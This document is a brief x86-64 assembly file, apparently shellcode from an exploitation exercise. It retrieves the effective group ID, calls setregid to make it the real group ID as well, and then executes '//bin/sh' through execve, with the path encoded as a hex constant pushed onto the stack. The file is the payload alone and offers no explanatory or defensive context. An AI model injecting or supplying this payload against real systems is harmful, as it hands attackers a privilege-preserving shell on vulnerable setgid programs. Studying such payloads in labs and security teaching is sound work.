#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
    mov $SYS_getegid, %rax
    syscall


    //setregid(egid, egid);
    mov %rax, %rdi // 1st arg
    mov %rax, %rsi // 2nd arg

    mov $SYS_setregid, %eax
    syscall


    //execve("/bin/sh", 0, 0);


    mov $0, %rsi
    mov $0, %rdx

    mov $SYS_execve, %rax


    mov $0x68732f6e69622f2f, %rbx
    push $0
    push %rbx
    mov %rsp, %rdi

    syscall

